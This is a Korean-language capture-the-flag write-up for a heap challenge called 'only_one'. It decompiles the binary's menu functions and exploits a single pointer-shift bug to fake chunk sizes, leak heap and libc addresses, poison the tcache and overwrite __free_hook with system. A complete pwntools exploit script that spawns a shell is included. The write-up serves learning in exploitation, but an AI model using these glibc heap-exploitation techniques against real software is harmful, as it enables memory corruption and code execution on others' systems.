# 문제이름
only_one
# Usage

# Concept
- 1번의 free 취약점을 가지고 heap_leak, libc_leak, hook_overwite를 설계하는 문제.

# Writeup
~
바이너리 분석

Canary, NX, PIE, Full RelRO가 걸려있다는 것을 확인할 수 있다.
```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  sub_14FE(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      sub_1476();
      __isoc99_scanf("%d", &v3);
      if ( v3 != 4 )
        break;
      sub_1249();
    }
    if ( v3 > 4 )
      break;
    switch ( v3 )
    {
      case 3:
        sub_13FB();
        break;
      case 1:
        sub_1303();
        break;
      case 2:
        sub_1424();
        break;
      default:
        goto LABEL_12;
    }
  }
LABEL_12:
  sub_1455();
}
```

메인함수이다.

sub_1476에서 메뉴판을 출력해주고 입력이 만약 4라면 sub_1249(), 3이라면 sub_13FB(), 2라면 sub_1424(), 1이라면 sub_1303()을 호출하고, 다른 입력이 들어오면 sub_1455()가 실행된다는 사실을 쉽게 알 수 있다.

각각의 함수를 순서대로 분석해보자.

4번 함수.

```c
int sub_1249()
{
  int result; // eax

  if ( dword_4010 != 1 )
    return puts("no chance");
  dword_4010 = 0;
  puts("what is your favorite number?(positive integer less than 2000)");
  __isoc99_scanf("%d", &dword_4040);
  if ( (unsigned int)dword_4040 >= 0x7D0 )
    return puts("wrong input");
  result = (_DWORD)ptr - dword_4040;
  ptr = (char *)ptr - dword_4040;
  return result;
}
```

.data:0000000000004010 dword_4010      dd 1

처음에 1이 들어있는 전역변수가 있다.

만약 1이 아니라면 바로 리턴 해버리고, 1이라면 0을 넣어주고 함수를 실행해준다.

2000미만의 자연수를 dword_4040에 입력 받아서 ptr -= dword_4040을 시켜준다.

double free 등을 발생 시킬 수 있는 매우 큰 취약점으로 보인다. 아직 ptr이 뭔지 모르니 다음에 다시 보도록 하자.

3번 함수.

```c
int sub_13FB()
{
  return printf("content is %s\n", (const char *)ptr);
}
```

현재 ptr이 가리키는 주소에 있는 값을 출력해주는 함수이다.

값을 채워 넣고 나서 무언가를 leak할 때 사용될 것이라는 것을 알 수 있다.

2번 함수.

```c
void sub_1424()
{
  if ( ptr )
    free(ptr);
  ptr = 0LL;
}
```

ptr이 가리키는 chunk를 free해주고 NULL로 초기화해준다.

1번함수.

```c
unsigned __int64 sub_1303()
{
  unsigned int size; // [rsp+8h] [rbp-18h] BYREF
  int size_4; // [rsp+Ch] [rbp-14h]
  void *buf; // [rsp+10h] [rbp-10h]
  unsigned __int64 v4; // [rsp+18h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  size = 0;
  printf("size: ");
  __isoc99_scanf("%d", &size);
  if ( size <= 0x3FF )
  {
    buf = malloc(size);
    printf("content: ");
    size_4 = read(0, buf, size);
    if ( *((_BYTE *)buf + size_4 - 1) == 10 )
      *((_BYTE *)buf + size_4 - 1) = 0;
    ptr = buf;
  }
  else
  {
    puts("it's too large");
  }
  return v4 - __readfsqword(0x28u);
}
```

0x3FF 이하인 size를 입력받고, 해당 size만큼 malloc한 다음 read를 통해 해당 chunk에 content를 size만큼 입력할 수 있게 해주고, ptr이 해당 chunk를 가리키게 하는 함수이다. 일반적인 함수이며 딱히 특이한 점은 보이지 않는다.

5번함수.

```c
void __noreturn sub_1455()
{
  puts("bye bye");
  exit(0);
}
```

마찬가지로 특이한 점이 보이지 않는다.

이렇게 모든 함수들을 살펴보면, 취약점이 있어 보이는 함수는 4번 함수밖에 보이지 않으니 4번 함수만 잘 공략한다면 문제를 해결할 수 있단 것을 생각할 수 있다.

```c
int sub_1249()
{
  int result; // eax

  if ( dword_4010 != 1 )
    return puts("no chance");
  dword_4010 = 0;
  puts("what is your favorite number?(positive integer less than 2000)");
  __isoc99_scanf("%d", &dword_4040);
  if ( (unsigned int)dword_4040 >= 0x7D0 )
    return puts("wrong input");
  result = (_DWORD)ptr - dword_4040;
  ptr = (char *)ptr - dword_4040;
  return result;
}
```

4번 함수를 다시 한번 살펴보자.

ptr이 최근에 생성한 chunk를 가리킨다는 것을 알고 있으니 이 함수가 그 chunk로부터 ptr을 heap영역에서 음의 방향으로 2000 미만의 크기만큼 이동하게 해주는 함수란 것을 알 수 있다.

따라서 double free가 가능해진다. 그런데 만약 그냥 이전 chunk의 주소를 가리키게 한 다음 free를 한다면 보호기법에 의해 안된다. key값을 미리 바꾸는 것도 불가능하다.

그렇다면 4번 함수를 통해 어떤 것을 할 수 있을까?

exploit

exploit을 하기 위해 필요한 정보들은 다음과 같다.

1. fake chunk를 만든 다음, 4번 함수를 통해 그곳으로 ptr을 옮긴 다음 free 후 malloc을 통해 이후에 있는 chunk들의 size를 조작할 수 있다. 
2. 그런 식으로 free 되어 next값이 저장된 chunk의 size까지 값을 채워 넣고 나서 3번 함수를 호출한다면 leak이 가능하다.
3. 1,2 번을 fastbin 크기의 chunk에 적용한다면 safe linking에 의해 heap_base>>12 가 leak될 것이고, size가 조작된largebin크기의 chunk에 적용한다면 unsortedbin에는 main_arena의 주소와 관련된 값이 있으므로 leak하면 libc_leak이 될 것이다.
4. free를 하는 함수는 최근에 생성된 chunk라서 tcache list의 count를 2로 만들기가 힘든데, size를 조작하여 tcache list의 count값을 키울 수 있다.
5. 이렇게 leak이 완료되었다면 4번에서 만든 tcache의 next에다가 Safe linking을 우회하여 주소를 쓴다면 다음 malloc이 되는 주소는 내가 원하는 주소일 것이다.
6. 따라서 AAW, libc_leak이 모두 가능해졌으므로 hook overwrite를 하면 쉘이 따질 것이다.

그런데 우리는 단 한번밖에 4번 함수를 사용하지 못하므로 신중하게 해야 한다.

exploit 순서

1. 0x400 크기의 fake chunk를 생성할 수 있도록 make를 해준다.
2. 이후 크기를 적절하게 할당해줘야하는데 정해진 정답은 없음.AAW할때 쓸 chunk 하나 만들고, 그 size로 size를 조작할 chunk도 만들고, heap_leak할 수 있고, unsorted bin을 free할 때 문제가 안생기도록 세팅해주면 된다.
3. 조작해서 이용하고 싶거나 heap_base나 libc_base 관련된 값을 leak 해야하는 chunk들은 delete 해준다. 
4. 4번 함수를 통해 1312만큼 전으로 가서 1번에서 했던 0x400짜리 chunk를 delete해준다.
5. delete를 하고나서 0x400 크기의 chunk를 make한 다음 tcache chunk에 저장된 heap_base>>12를 leak 해준다.
6. 또 delete 이후 make하여 사용할 chunk들의 size들을 다 조작해준다.
7. unsorted bin이 되도록 make 후 free해준다.
8. 0x400짜리 chunk로 돌아와서 unsorted bin에 있는 main_arena 값을 leak하여 libc_leak을 해준다.
9. libc를 leak 했으므로 tcache의 next를 조작하여 __free_hook에 malloc을 할 수 있다.
10. 이를 위해 0x310 size의 chunk를 size 조작을 통해 free한 다음, next의 주소에 heap>>12 ^ __free_hook 을 넣으면 2번째 malloc에서 __free_hook overwrite가 된다.
11. 2번째 malloc에 system_addr을 넣고, "/bin/sh" 라는 chunk를 make해준다음 delete해주면 쉘이 따진다.

exploit.py

```python
from pwn import *

p=process("./prob")
e=ELF("./prob")
libc=e.libc
def make(size,msg):
    p.recvuntil("What do you want to do? :")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.send(msg)
def delete():
    p.recvuntil("What do you want to do? :")
    p.sendline("2")
def rd(n):
    p.recvuntil("What do you want to do? :")
    p.sendline("3")
    p.recvuntil("a"*n)
    return (p.recvline())
def bug(num):
    p.recvuntil("What do you want to do? :")
    p.sendline("4")
    p.recvuntil("(positive integer less than 2000)\n")
    p.sendline(str(num))

heap_base=0
pause()

make(240,"a")
delete()
payload = b'a'*720
payload +=p64(0x401)*6
make(768,payload)
delete()
make(80,"a")
delete()
make(16,"a")
delete()
make(272,"a")
make(64,"a")
delete()
make(32,"a")
delete()
make(720,p64(0x11)*90)
make(712,p64(0x11)*89)
bug(1312)
delete()
#======================heap leak
make(1008,"a"*32)
a=rd(32)
a=u64(a.rstrip().ljust(8,b"\x00"))
heap_base=a<<12
b=a
delete()
make(1008,b"b"*(0x18)+p64(0x61)+p64(a)+b'b'*0x50+p64(0x491)+p64(a)+b"b"*(0x10)+p64(0x121)+p64(a)+b'b'*0x110+p64(0xc1)+b"b"*0x48+p64(0x311))
delete()
make(16,"a")
delete()
make(1008,b"a"*0x80)
#===================libc_leak
a=rd(0x80)
a=u64(a.rstrip().ljust(8,b"\x00"))
main_arena = a-96
libc.address=main_arena - (libc.symbols["__malloc_hook"]+0x10)
print(hex(libc.address))
delete()
make(1008,b"a"*0x18 + p64(0x61)+p64(b)+b"a"*0x50 + p64(0x491))
delete()

make(0x20,"a")
delete()
make(0x40,"a")
delete()

free_hook = libc.symbols["__free_hook"]
print(hex(free_hook))
system_addr=libc.symbols["system"]
make(0xb0,b"d"*0x50+p64(free_hook^(b)))
make(0x300,"a")
make(0x300,p64(system_addr))
make(0x20,b"/bin/sh\x00")
delete()

pause()
p.interactive()

```


실행하면 안정적으로 쉘이 따진다. ~ 